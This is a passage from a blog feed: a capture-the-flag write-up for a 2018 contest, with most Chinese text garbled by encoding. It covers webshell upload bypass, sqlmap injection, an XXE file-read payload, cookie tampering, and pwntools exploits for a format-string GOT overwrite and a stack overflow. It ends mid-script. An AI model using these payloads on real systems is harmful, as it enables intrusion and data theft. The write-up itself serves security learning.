        <content type="html"><![CDATA[<p>â€¦â€¦</p><a id="more"></a><h1 id="wandoucup-ctf"><a href="#wandoucup-ctf" class="headerlink" title="wandoucup-ctf"></a>wandoucup-ctf</h1><blockquote><p>è¿™ä¸¤å¤©åœ¨æ‰“ä¸€ä¸ªç¨å¾®ç®€å•çš„CTFï¼Œå†™ä¸ªwriteupè®°å½•ä¸€ä¸‹è¢«è™çš„è¿‡ç¨‹ğŸ˜­ï¼Œæ€»çš„æ¥è¯´è¿™åœºå°èµ›æ˜¯ä¸ªå¤§æ‚çƒ©ï¼Œæ¯•ç«Ÿä½ æ‡‚çš„ğŸ˜ï¼Œä½œä¸ºåšé¢˜è€…æˆ‘ä»¬å½“ç„¶æ˜¯æœ‰é¢˜åšå°±okçš„ã€‚</p><p>ç”±äºæ¯”èµ›åç¯å¢ƒå…³é—­ï¼Œæ‰€ä»¥æœ‰çš„æ— å›¾ç‰‡å±•ç¤ºï¼Œç°æœ‰çš„å›¾ç‰‡æ˜¯ä¸‹åˆå°±å‡†å¤‡å†™writeupæˆªçš„å›¾ã€‚</p></blockquote><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="web1-ç­¾åˆ°é¢˜"><a href="#web1-ç­¾åˆ°é¢˜" class="headerlink" title="web1-ç­¾åˆ°é¢˜"></a>web1-ç­¾åˆ°é¢˜</h3><p><a href="http://101.231.137.47:20001/" target="_blank" rel="noopener">é¢˜ç›®é“¾æ¥</a></p><blockquote><p>è·ŸæŸå‡ ä¸ªctfç»ƒä¹ å¹³å°ä¸Šé¢çš„æ»‘ç¨½é¢˜ä¸€æ ·ï¼š</p><p><img src="https://i.loli.net/2018/10/28/5bd55a6403431.png" alt=""></p></blockquote><p>ä¸€é”®è·å–flagğŸ˜„ã€‚</p><h3 id="web2-è¾“å…¥å¯†ç æŸ¥çœ‹flag"><a href="#web2-è¾“å…¥å¯†ç æŸ¥çœ‹flag" class="headerlink" title="web2-è¾“å…¥å¯†ç æŸ¥çœ‹flag"></a>web2-è¾“å…¥å¯†ç æŸ¥çœ‹flag</h3><p><a href="http://101.231.137.47:20002/4.php" target="_blank" rel="noopener">é¢˜ç›®é“¾æ¥</a></p><blockquote><p>ç®€å•æµè§ˆä¸€ä¸‹ï¼Œå°±æ˜¯ä¸€ä¸ªçˆ†ç ´çš„é¢˜ï¼š</p><p><img src="https://i.loli.net/2018/10/28/5bd56b3b1d5b7.png" alt=""></p><p>å¯†ç ä¸ºäº”ä½æ•°ï¼Œé‚£æˆ‘ä»¬ç›´æ¥ä¸Šburpsuiteå’¯ï¼šè®¾ç½®é•¿åº¦å’Œpayloadå­—ç¬¦ï¼š</p><p><img src="https://i.loli.net/2018/10/28/5bd56b9a814dd.png" alt=""></p><p><img src="https://i.loli.net/2018/10/28/5bd590f273c5b.png" alt=""></p><p>GET FLAG!</p></blockquote><h3 id="web3-è¿™çœŸèƒ½ä¼ é©¬ï¼Ÿ"><a href="#web3-è¿™çœŸèƒ½ä¼ é©¬ï¼Ÿ" class="headerlink" title="web3-è¿™çœŸèƒ½ä¼ é©¬ï¼Ÿ"></a>web3-è¿™çœŸèƒ½ä¼ é©¬ï¼Ÿ</h3><p><a href="http://101.231.137.47:20003/" target="_blank" rel="noopener">é¢˜ç›®é“¾æ¥</a></p><blockquote><p>ç®€å•åœ°æŠ“åŒ…ä¿®æ”¹å‚æ•°ï¼Œä»è€Œä½¿å¾—è‡ªå·±èƒ½å¤Ÿä¼ phpï¼Œæˆ‘ç›´æ¥ä¸Šäº†ä¸€ä¸ªå¤§é©¬ï¼Œç„¶åçœ‹/opt/flag.txtã€‚</p><p><img src="https://i.loli.net/2018/10/28/5bd56d1fde396.png" alt=""></p><p>æŠ“åŒ…å¯ä»¥çœ‹åˆ°urlä¸­çš„extå‚æ•°ä¼ é€’çš„æ˜¯æ–‡ä»¶ç±»å‹ï¼ŒçŒœæµ‹æ˜¯å¯ä»¥ä¿®æ”¹ï¼Œæˆ‘ä»¬åŠ ä¸ªphpåˆ°ä¸­é—´å³å¯æˆåŠŸåœ°ç›´æ¥ä¸Šä¼ webshellï¼ˆå¾ˆæŠ è„šï¼‰ã€‚</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/28/5bd56da602535.png" class="lazyload"></p><p>ç„¶åå†ä¿®æ”¹ä¸€ä¸‹content-typeå³å¯ï¼š</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/28/5bd56ea016a98.png" class="lazyload"></p></blockquote><p>To /opt/flag.txt  get flag==&gt;ğŸ˜„</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/28/5bd56ef831e0e.png" class="lazyload"></p><h3 id="web4-è¿™çœŸèƒ½æ³¨å…¥ï¼Ÿ"><a href="#web4-è¿™çœŸèƒ½æ³¨å…¥ï¼Ÿ" class="headerlink" title="web4-è¿™çœŸèƒ½æ³¨å…¥ï¼Ÿ"></a>web4-è¿™çœŸèƒ½æ³¨å…¥ï¼Ÿ</h3><p>é¢˜ç›®é“¾æ¥</p><blockquote><p>æµè§ˆä¸€ä¸‹ï¼ŒåŠ ä¸ªå•å¼•å·è¯•è¯•å°±ä¸€ä¸ªå¾ˆæ˜æ˜¾çš„æ³¨å…¥å’¯ï¼š</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/28/5bd56f5203775.png" class="lazyload"></p><p>ç›´æ¥sqlmapæ³¨å…¥å³å¯ï¼Œ<code>sqlmap -u http://101.231.137.47:20004/php/index.php?gid=1 --dbs</code></p><p>å¾—åˆ°æ•°æ®åº“ååç›´æ¥é€æ­¥æŒ‡å®šæ•°æ®åº“è¡¨ï¼ŒæŒ‡å®šå­—æ®µï¼Œdumpå³å¯ã€‚</p><p>ç”±äºæ¯”èµ›åæœåŠ¡å·²ç»å…³é—­æ•…æœªèƒ½æˆªå–æˆåŠŸå›¾ç‰‡ã€‚</p></blockquote><h3 id="web5-API"><a href="#web5-API" class="headerlink" title="web5-API"></a>web5-API</h3><blockquote><p>è¿™é¢˜æ˜¯xxeå¤–éƒ¨å®ä½“æ³¨å…¥ï¼Œé€šè¿‡æŠ“åŒ…ï¼Œä¿®æ”¹POSTæ•°æ®ä»¥åŠContent-typeä»è€Œè¯»å–åˆ°/tmp/flag.txtã€‚</p><blockquote><p>XXEæ¼æ´å°±æ˜¯æœåŠ¡å™¨æ¥å—ä»å®¢æˆ·ç«¯å‘é€æ¥çš„xmlæ ¼å¼æ•°æ®æ—¶ï¼Œxmlæ•°æ®ä¸­æ¶æ„çš„å¼•ç”¨äº†å¤–éƒ¨å®ä½“ï¼Œå°†å®ƒçš„å€¼ç»‘å®šä¸ºæœåŠ¡å™¨çš„ç›®æ ‡æ–‡ä»¶ï¼Œè¿™æ ·åœ¨æœåŠ¡å™¨è¿”å›ç»™æˆ‘ä»¬è§£æåçš„å€¼æ—¶ï¼Œå°±ä¼šæŠŠç›®æ ‡æ–‡ä»¶çš„å†…å®¹è¿”å›ç»™æˆ‘ä»¬ï¼Œä»è€Œè¯»å–æ•æ„Ÿæ–‡ä»¶å†…å®¹ã€‚</p></blockquote><p>é¢˜ç›®åŸæœ¬ä¼ è¾“çš„<code>Content-type: application/json</code>æ”¹ä¸º<code>Content-type: application/xml</code>ï¼Œå¹¶å°†POSTçš„æ•°æ®æ”¹ä¸ºä»¥ä¸‹xmlä»£ç :</p><pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version=â€1.0â€³?></span><span class="token doctype">&lt;!DOCTYPE a[&lt;!ENTITY xxe SYSTEM â€œfile:///tmp/flag.txtâ€></span>]><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>something</span><span class="token punctuation">></span></span><span class="token entity" title="&xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>something</span><span class="token punctuation">></span></span></code></pre><p>ç„¶åå‘é€æ•°æ®åŒ…ï¼Œå°±å¯å¾—åˆ°apiè¿”å›çš„flagäº†ã€‚</p></blockquote><h3 id="web6-sweet-home"><a href="#web6-sweet-home" class="headerlink" title="web6-sweet home"></a>web6-sweet home</h3><blockquote><p>è¿™é“é¢˜æœ‰ç‚¹ä¸œè¥¿ï¼Œä¸€æ­¥ä¸€æ­¥æ·±å…¥ï¼Œåˆ°æœ€åä¸€ä¸ªæç¤ºæ”¾å‡ºä¹‹åå‡ åˆ†é’Ÿï¼Œè¿…é€Ÿæ‹¿åˆ°flagã€‚</p><p>æ­¥éª¤ï¼šç™»å½•å’Œæ³¨å†Œç•Œé¢éœ€è¦å†™è„šæœ¬æŠ›å‡ºå¯¹åº”è§„åˆ™çš„codeï¼Œç„¶åé€šè¿‡ç›®å½•éå†å¾—åˆ°éƒ¨åˆ†é¡µé¢æºç ä»¥åŠä¸€ä¸ªç›®å½•(åˆ†åˆ«æ˜¯<code>user.php~</code>ï¼Œ <code>config.php~</code>ï¼Œ<code>adminpic</code>)ï¼Œæ ¹æ®æºç å¯ä»¥å¾—çŸ¥adminpicæ˜¯adminç”¨æˆ·ä¸Šä¼ æ–‡ä»¶çš„ä¸€ä¸ªç›®å½•ï¼Œå¹¶ä¸”æˆ‘ä»¬å¯ä»¥å¾—åˆ°æ•°æ®åº“è´¦å·å¯†ç ï¼Œå…¨ç«¯å£æ‰«æå¾—åˆ°23306ç«¯å£ä¸ºæ•°æ®åº“æœåŠ¡ç«¯å£ï¼Œç™»é™†åå¾—åˆ°adminè´¦æˆ·å¯†ç ï¼Œç»è¿‡å¤§åŠå¤©çš„ç ´è§£md5ä¹‹åï¼Œå¾—åˆ°æç¤º<code>crypto.html</code>ï¼Œè¿™æ˜¯ä¸€ä¸ªæŒ‡å®šçš„è§£å¯†md5çš„é¡µé¢ï¼Œè¾“å…¥adminå¯†ç hashå€¼ç ´è§£å¾—åˆ°æç¤º<code>crypto.png</code>ï¼Œè®¿é—®å¾—åˆ°äºŒç»´ç ï¼Œæ‰«æå³å¯è·å¾—å¯†ç <code>wandouxueyuan:)</code>ï¼Œç”¨æ­¤å¯†ç å¯ç™»å½•adminè´¦æˆ·ï¼Œæ¥åˆ°ä¸Šä¼ å›¾ç‰‡publishé¡µé¢ï¼Œç»“åˆå‰é¢éå†å¾—åˆ°çš„ä¸€ä¸ª<code>adminpic</code>ç›®å½•å¯ä»¥çŸ¥é“ä¸Šä¼ æ–‡ä»¶åœ¨æ­¤ç›®å½•ä¸­ï¼Œç»è¿‡ç®€å•çš„ç»•è¿‡åä¸Šä¼ å¤§é©¬å³å¯ã€‚</p><p>å‚»å‚»çš„æˆ‘è¿˜å°è¯•æ–‡ä»¶åŒ…å«ï¼Œsession_decodeï¼Œä»¥åŠregisteræ³¨å†Œç­‰ç­‰æ“ä½œã€‚</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/28/5bd5d5ba033c9.png" class="lazyload"></p></blockquote><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/28/5bd5a2a3dd284.png" class="lazyload"></p><p>ä¼ å®Œé©¬åè®¿é—®/adminpicç›®å½•å³å¯çœ‹åˆ°è‡ªå·±ä¸Šä¼ çš„æ–‡ä»¶ï¼Œä»è€Œgetshellæ‹¿åˆ°flagï¼š</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/28/5bd5d6ffa0abd.png" class="lazyload"></p><h3 id="webé™„åŠ é¢˜-atom"><a href="#webé™„åŠ é¢˜-atom" class="headerlink" title="webé™„åŠ é¢˜-atom"></a>webé™„åŠ é¢˜-atom</h3><blockquote><p>è¿™é“webåŠ é¤é¢˜ï¼Œå®é™…ä¸Šå°±æ˜¯ç”¨ç»™çš„è´¦æˆ·å¯†ç ç™»å½•åå°†cookieä¸­çš„<code>admin=0</code>æ”¹ä¸º<code>admin=1</code>ï¼Œç„¶åä¼šè·³è½¬åˆ°ä¸€ä¸ªåå°ï¼Œç„¶åæŸ¥çœ‹åå°æºç å³å¯å¾—åˆ°çœŸæ­£çš„flagã€‚</p></blockquote><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><blockquote><p>ä¸‰ä¸ªpwnéƒ½éå¸¸ç»å…¸ï¼Œåˆ†åˆ«è€ƒå¯Ÿæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œç®€å•çš„æº¢å‡ºï¼Œä»¥åŠret2syså‡ ä¸ªçŸ¥è¯†ç‚¹ã€‚</p></blockquote><h3 id="pwn1â€“æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´"><a href="#pwn1â€“æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´" class="headerlink" title="pwn1â€“æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´"></a>pwn1â€“æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</h3><p>é€šè¿‡ç”¨IDAç®€å•åœ°åˆ†æä¸€ä¸‹é€»è¾‘ï¼Œå¯ä»¥çœ‹åˆ°printfå¤„å­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼š</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#vuln_funå‡½æ•°ä¼ªcä»£ç </span><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp-Ch] [ebp-7Ch]</span>  <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp-8h] [ebp-78h]</span>  <span class="token keyword">int</span> v6<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp-4h] [ebp-74h]</span>  <span class="token keyword">int</span> format<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+0h] [ebp-70h]</span>  <span class="token keyword">int</span> v8<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+4h] [ebp-6Ch]</span>  <span class="token keyword">int</span> v9<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+8h] [ebp-68h]</span>  <span class="token keyword">int</span> v10<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+Ch] [ebp-64h]</span>  <span class="token keyword">int</span> v11<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+10h] [ebp-60h]</span>  <span class="token keyword">int</span> v12<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+14h] [ebp-5Ch]</span>  <span class="token keyword">int</span> v13<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+18h] [ebp-58h]</span>  <span class="token keyword">int</span> v14<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+1Ch] [ebp-54h]</span>  <span class="token keyword">int</span> v15<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+20h] [ebp-50h]</span>  <span class="token keyword">int</span> v16<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+24h] [ebp-4Ch]</span>  <span class="token keyword">int</span> v17<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+28h] [ebp-48h]</span>  <span class="token keyword">int</span> v18<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+2Ch] [ebp-44h]</span>  <span class="token keyword">int</span> v19<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+30h] [ebp-40h]</span>  <span class="token keyword">int</span> v20<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+34h] [ebp-3Ch]</span>  <span class="token keyword">int</span> v21<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+38h] [ebp-38h]</span>  <span class="token keyword">int</span> v22<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+3Ch] [ebp-34h]</span>  <span class="token keyword">int</span> v23<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+40h] [ebp-30h]</span>  <span class="token keyword">int</span> v24<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+44h] [ebp-2Ch]</span>  <span class="token keyword">int</span> v25<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+48h] [ebp-28h]</span>  <span class="token keyword">int</span> v26<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+4Ch] [ebp-24h]</span>  <span class="token keyword">int</span> v27<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+50h] [ebp-20h]</span>  <span class="token keyword">int</span> v28<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+54h] [ebp-1Ch]</span>  <span class="token keyword">int</span> v29<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+58h] [ebp-18h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v30<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+64h] [ebp-Ch]</span>  <span class="token keyword">int</span> <span class="token operator">*</span>v31<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+6Ch] [ebp-4h]</span>  v31 <span class="token operator">=</span> <span class="token operator">&amp;</span>argc<span class="token punctuation">;</span>  v30 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>format<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x64u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span>    <span class="token number">0</span><span class="token punctuation">,</span>    <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>format<span class="token punctuation">,</span>    <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token string">"%s"</span><span class="token punctuation">,</span>    <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>format<span class="token punctuation">,</span>    v4<span class="token punctuation">,</span>    v5<span class="token punctuation">,</span>    v6<span class="token punctuation">,</span>    format<span class="token punctuation">,</span>    v8<span class="token punctuation">,</span>    v9<span class="token punctuation">,</span>    v10<span class="token punctuation">,</span>    v11<span class="token punctuation">,</span>    v12<span class="token punctuation">,</span>    v13<span class="token punctuation">,</span>    v14<span class="token punctuation">,</span>    v15<span class="token punctuation">,</span>    v16<span class="token punctuation">,</span>    v17<span class="token punctuation">,</span>    v18<span class="token punctuation">,</span>    v19<span class="token punctuation">,</span>    v20<span class="token punctuation">,</span>    v21<span class="token punctuation">,</span>    v22<span class="token punctuation">,</span>    v23<span class="token punctuation">,</span>    v24<span class="token punctuation">,</span>    v25<span class="token punctuation">,</span>    v26<span class="token punctuation">,</span>    v27<span class="token punctuation">,</span>    v28<span class="token punctuation">,</span>    v29<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>format<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</span>  <span class="token function">fflush</span><span class="token punctuation">(</span>_bss_start<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">//è¦†ç›–gotè¡¨ä¸­fflushæ¡ç›®æŒ‡å‘çš„åœ°å€ï¼Œå°†å…¶æŒ‡å‘read_flagå‡½æ•°</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>ç®€å•è¿è¡Œä¸€ä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥æ„é€ è¯­å¥ï¼š<code>aaaa-%p-%p-%p-%p-%p-%p-%p-%p</code>ï¼Œç„¶åè¾“å…¥å¾—åˆ°ï¼š</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/28/5bd5a6468eaa6.png" class="lazyload"></p><p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬çš„è¾“å…¥è¢«æ”¾åœ¨äº†printfå‡½æ•°æ ˆä¸­çš„ç¬¬6ä¸ªä½ç½®ï¼ˆè¿™é‡Œçš„%pæ˜¯c/c++ä¸­æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„å‚æ•°ï¼‰ï¼Œæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æœ€ä¸»è¦çš„å±å®³å°±æ˜¯å¯ä»¥è·å–ä»»æ„åœ°å€å†…å®¹ï¼Œæˆ–è€…å®ç°ä»»æ„åœ°å€å†™ï¼Œé‚£ä¹ˆæˆ‘ä»¬è¿™å°±æ˜¯é€šè¿‡ä»»æ„åœ°å€å†™ï¼Œæ¥è¦†ç›–gotè¡¨ï¼Œä¹‹å‰çš„<a href="https://www.yof3ng.xyz/2018/10/26/Pwn-10%E6%9C%8826-Hitcon-%E5%9B%9B/">ç»ƒä¹ è®°å½•</a>ä¸­å°±æåˆ°äº†è¿™äº›çŸ¥è¯†ã€‚</p><p>æ—¢ç„¶çŸ¥é“äº†åˆ©ç”¨ä½ç½®ï¼Œé‚£ä¹ˆç›´æ¥åˆ©ç”¨pwntoolsæ„é€ expï¼š</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding:utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span><span class="token comment" spellcheck="true">#io = process('./200')</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./200'</span><span class="token punctuation">)</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'101.231.137.47'</span><span class="token punctuation">,</span><span class="token string">'20010'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#read_flag_addr = 0x0804859B</span>read_flag_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'read_flag'</span><span class="token punctuation">]</span><span class="token comment" spellcheck="true">#bss_addr = 0x0804A034</span>got_printf_addr <span class="token operator">=</span> <span class="token number">0x0804A00c</span>got_fflush_addr <span class="token operator">=</span> <span class="token number">0x0804A010</span><span class="token comment" spellcheck="true">#è¦†ç›–fflushåœ°å€æŒ‡å‘çš„å†…å®¹ï¼Œä»è€Œå®ç°read_flagè·³è½¬</span>payload <span class="token operator">=</span> fmtstr_payload<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>got_fflush_addr<span class="token punctuation">:</span> <span class="token number">0x0804859B</span><span class="token punctuation">}</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>expæ•ˆæœï¼š</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/28/5bd5919f74fc3.png" class="lazyload"></p><h3 id="pwn2â€“æ ˆæº¢å‡º"><a href="#pwn2â€“æ ˆæº¢å‡º" class="headerlink" title="pwn2â€“æ ˆæº¢å‡º"></a>pwn2â€“æ ˆæº¢å‡º</h3><blockquote><p>ç®€å•çš„æ ˆæº¢å‡ºå•¦ï¼Œå¾ˆå¸¸è§çš„ï¼Œæ‰¾åˆ°æº¢å‡ºç‚¹ç„¶åæŠŠEIPæŒ‡å‘æˆ‘ä»¬çš„<code>win</code>å‡½æ•°åœ°å€å³å¯:</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/28/5bd5a81b27580.png" class="lazyload"></p><p>é€šè¿‡<code>gdb-peda</code>,patternæ¨¡å—ï¼Œæ‰¾åˆ°æº¢å‡ºåç§»é‡ä¸º76ï¼Œä¹Ÿå°±æ˜¯è¯´åªéœ€è¦æ„é€ <code>76*&#39;a&#39; + win_addr</code>å³å¯:</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/28/5bd5a40fae3f4.png" class="lazyload"></p></blockquote><p>æ„é€ exp:</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding:utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span><span class="token comment" spellcheck="true">#idaä¸­æœ‰winå‡½æ•°çš„åœ°å€</span>win_addr <span class="token operator">=</span> <span class="token number">0x08048488</span><span class="token comment" spellcheck="true">#io = process('101.231.137.47',20011)</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./100'</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token number">76</span><span class="token operator">*</span><span class="token string">'a'</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>win_addr<span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>è¿è¡Œæ•ˆæœ(å› ä¸ºç¯å¢ƒå·²ç»å…³é—­ï¼Œæ‰€ä»¥åªèƒ½å±•ç¤ºæœ¬åœ°æ•ˆæœ):</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/28/5bd5a99272847.png" class="lazyload"></p><h3 id="pwn3â€“ret2syscall"><a href="#pwn3â€“ret2syscall" class="headerlink" title="pwn3â€“ret2syscall"></a>pwn3â€“ret2syscall</h3><blockquote><p>pwn3çš„è¯ç¨å¾®æ¯”ä¸Šé¢ä¸¤é¢˜è¦éš¾ä¸Šä¸€ç‚¹ç‚¹ï¼Œä¸è¿‡è¿˜åœ¨æˆ‘è¿™ä¸ªèŒæ–°çš„æ‰¿å—èŒƒå›´ä¹‹å†…ï¼Œå…ˆæ£€æŸ¥ä¸€ä¸‹ä¿æŠ¤æªæ–½ï¼š</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/28/5bd5ab2b01106.png" class="lazyload"></p><p>å¯ä»¥çœ‹åˆ°åªæ˜¯å¼€äº†æ ˆä¸å¯æ‰§è¡Œ ï¼ˆNX)ï¼Œé™æ€åˆ†æä¸€æ³¢:</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/28/5bd5ab68bccdf.png" class="lazyload"></p><p>è¿™é‡Œæˆ‘ä»¬ä¹Ÿå¯ä»¥çœ‹åˆ°ä¸€ä¸ªwin_funcå‡½æ•°ï¼ŒçŒœæµ‹åŒæ ·æ˜¯åˆ©ç”¨è¿”å›åˆ°è¯¥å‡½æ•°ä»è€Œå¾—åˆ°flagï¼Œé‚£ä¹ˆå¦‚ä½•è¿”å›åˆ°è¿™ä¸ªwin_funcå‡½æ•°å‘¢ï¼Ÿ</p><p>æˆ‘ä»¬æ³¨æ„åˆ°mem_testå‡½æ•°ä¼ªcä»£ç å¦‚ä¸‹:</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/28/5bd5bef61db2e.png" class="lazyload"></p><p>ç›´æ¥<code>return result</code>ï¼Œé‚£ä¹ˆå¦‚æœæœ‰æº¢å‡ºå­˜åœ¨ï¼Œé‚£æˆ‘ä»¬èƒ½ä¸èƒ½è¦†ç›–æ‰è¿™ä¸ªå‡½æ•°çš„è¿”å›åœ°å€å‘¢ï¼Œé‚£å½“ç„¶æ˜¯å¯è¡Œçš„(è¿™é¢˜ä¸èƒ½ç›´æ¥ç”¨pattern createå¾—åˆ°åç§»é‡ï¼Œå¦‚æœpatternè¿‡å¤§åˆ™ä¼šå¯¼è‡´æ— æ³•è¦†ç›–eipï¼‰ï¼Œç”¨gdbåœ¨mem_testå‡½æ•°ä¸‹æ–­ç‚¹è°ƒè¯•ï¼š</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/28/5bd5cdf24a4fa.png" class="lazyload"></p><p>ç„¶åæ ¹æ®ä¹‹å‰idaåˆ†æå˜é‡sçš„ä½ç½®ä¸º<code>ebp-0x13</code>,æˆ‘ä»¬å¯ä»¥çŸ¥é“ï¼Œ<code>ebp = 0xffffd145 +0x13 = 0xffffd158</code>ï¼Œæˆ–è€…ç›´æ¥åœ¨gdbçœ‹ebpçš„å€¼ï¼Œå¯ä»¥çŸ¥é“<code>0x8048718</code>å°±æ˜¯returnè¿”å›çš„åœ°å€ã€‚æˆ‘ä»¬éœ€è¦å°†å®ƒè¦†ç›–æˆwin_funcçš„åœ°å€ã€‚</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/28/5bd5cec20e1ef.png" class="lazyload"></p><p>è€Œcatflagåœ°å€å°±æ˜¯ä¸€å¼€å§‹è¾“å‡ºçš„é‚£ä¸ªhint:<code>0x080487E0</code></p></blockquote><p>æ„é€ expï¼š</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding:utf-8</span>Author <span class="token operator">=</span> <span class="token string">"Yof3ng"</span><span class="token keyword">from</span> pwn <span class="token 